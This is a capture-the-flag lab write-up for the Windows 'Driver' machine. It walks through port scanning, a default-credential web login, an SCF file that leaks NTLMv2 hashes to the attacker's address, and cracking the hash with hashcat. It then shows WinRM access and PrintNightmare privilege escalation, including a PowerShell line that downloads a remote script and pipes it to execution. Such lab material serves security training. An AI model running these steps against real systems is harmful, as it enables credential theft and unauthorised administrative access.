## Driver

### Lab Details 

- Difficulty: Easy
- Type:  Windows

#### Enumeration
- run `nmap`
```
PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http         syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp  open  msrpc        syn-ack Microsoft Windows RPC
445/tcp  open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 11 (86%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
```
- investigate port `135/445`- SMB
	- unable to login anonymously 
- investigate port `80` - HTTP
	- requires credentials to login
	- attempted `admin:admin` - successful
	- greeted with `MFP Firmware Update Center` as home page
![[home page.png]]
	- `Firmware Update` page allows file upload
![[Fileware Updates.png]]
- The text above states that the upload will be stored at a file share and the testing team will review the upload manually, which means that a user will manually click on the file uploaded. 
- we can upload a SCF file to the fileshare.
- A SCF (Shell Command File) is a Windows shortcut file that can force a victim's system to authenticate to an attacker-controlled server, leaking their NTLMv2 hash.

#### Initial Foothold 
- fist we will need to create the SCF file 
- adding `@` will make the file appear at the top of the listing
```
$ cat @file.scf  
[Shell]
Command=2
IconFile=\\10.10.16.22\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
- upload the payload to the fileshare and start responder 
```
$ sudo responder -w -I tun0

[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

<snip>

[+] Listening for events...                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:3c0aacbb8e19d22c:8C063D2C82D44DBEE3109E29FA6FFEA7:010100000000000000CC549CA302DC0131E8CE6F09BC614C0000000002000800420050003200510001001E00570049004E002D0046004A0053005900420047004A00540032004700500004003400570049004E002D0046004A0053005900420047004A0054003200470050002E0042005000320051002E004C004F00430041004C000300140042005000320051002E004C004F00430041004C000500140042005000320051002E004C004F00430041004C000700080000CC549CA302DC01060004000200000008003000300000000000000000000000002000008C58F076EB888ACCD09F510B6E62451D18FA1B8032E0D5E4C8B37C5846962B690A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0032003200000000000000000000000000   
```
- we get the NTLM hash, use hashcat to decrypt the hash
```
$ hashcat -m 5600 tony.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
<snip>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

TONY::DRIVER:3c0aacbb8e19d22c:8c063d2c82d44dbee3109e29fa6ffea7:010100000000000000cc549ca302dc0131e8ce6f09bc614c0000000002000800420050003200510001001e00570049004e002d0046004a0053005900420047004a00540032004700500004003400570049004e002d0046004a0053005900420047004a0054003200470050002e0042005000320051002e004c004f00430041004c000300140042005000320051002e004c004f00430041004c000500140042005000320051002e004c004f00430041004c000700080000cc549ca302dc01060004000200000008003000300000000000000000000000002000008c58f076eb888accd09f510b6e62451d18fa1b8032e0d5e4c8b37c5846962b690a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0032003200000000000000000000000000:liltony
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TONY::DRIVER:3c0aacbb8e19d22c:8c063d2c82d44dbee3109...000000
Time.Started.....: Fri Aug  1 05:37:25 2025 (0 secs)
Time.Estimated...: Fri Aug  1 05:37:25 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1063.6 kH/s (0.96ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 32768/14344385 (0.23%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 30720/14344385 (0.21%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: !!!!!! -> eatme1
Hardware.Mon.#1..: Util: 29%

Started: Fri Aug  1 05:37:23 2025
Stopped: Fri Aug  1 05:37:27 2025
```
- since port 5985 is open, we can use `evil-winrm` to get a shell
```
$ evil-winrm -i 10.10.11.106  -u tony  -p liltony
```
#### Lateral Movement (If any)

#### Privilege Escalation
- load and run `winpeas.bat` 
- check Powershell persistent history file
```
*Evil-WinRM* PS C:\Users\tony\Documents> cat C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
```
- search `RICOH PCL6 UniversalDriver V4.23` found CVE for privilege escalation
- tried below
	- windows/local/ricoh_driver_privesc - mfsconsole (Hangs at adding printer)
```
msf6 exploit(windows/local/ricoh_driver_privesc) > run
[*] Started reverse TCP handler on 10.10.16.22:9001 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer LOkvnsv...

```
	- cve_2021_1675_printnightmare - msfconsole (Broken pipe)
```
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > run
[*] Started reverse TCP handler on 10.10.16.22:4444 
[*] 10.10.11.106:445 - Running automatic check ("set AutoCheck false" to disable)
[*] 10.10.11.106:445 - Target environment: Windows v10.0.10240 (x64)
[*] 10.10.11.106:445 - Enumerating the installed printer drivers...
[*] 10.10.11.106:445 - Retrieving the path of the printer driver directory...
[+] 10.10.11.106:445 - The target is vulnerable. Received ERROR_BAD_NET_NAME, implying the target 
[*] 10.10.11.106:445 - Server is running. Listening on 10.10.16.22:445
[*] 10.10.11.106:445 - Server started.
[*] 10.10.11.106:445 - The named pipe connection was broken, reconnecting...
[*] 10.10.11.106:445 - Successfully reconnected to the named pipe.
[*] 10.10.11.106:445 - The named pipe connection was broken, reconnecting...
[*] 10.10.11.106:445 - Successfully reconnected to the named pipe.
[*] Exploit completed, but no session was created.
```
	- https://github.com/calebstewart/CVE-2021-1675
```
*Evil-WinRM* PS C:\Users\tony\Documents> curl http://10.10.16.22:8000/CVE-2021-1675.ps1 -UseBasicParsing | iex
*Evil-WinRM* PS C:\Users\tony\Documents> Get-Command Invoke-Nightmare

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-Nightmare
*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[!] failed to get current driver list
```
- tried and worked: https://github.com/JohnHammond/CVE-2021-34527
```
*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure" 
 
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user john as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
*Evil-WinRM* PS C:\Users\tony\Documents> net user john
User name                    john
Full Name                    john
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/3/2025 2:37:53 AM
Password expires             Never
Password changeable          8/3/2025 2:37:53 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.

$ evil-winrm -i 10.10.11.106  -u john  -p SuperSecure
*Evil-WinRM* PS C:\Users\john\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
SeLoadDriverPrivilege           Load and unload device drivers            Enabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Enabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeBackupPrivilege               Back up files and directories             Enabled
SeRestorePrivilege              Restore files and directories             Enabled
SeShutdownPrivilege             Shut down the system                      Enabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
SeUndockPrivilege               Remove computer from docking station      Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     
```
#### Resources
- CVE-2021-34527 - PrintNightmare LPE (PowerShell): https://github.com/JohnHammond/CVE-2021-34527

#### Lesson Learned
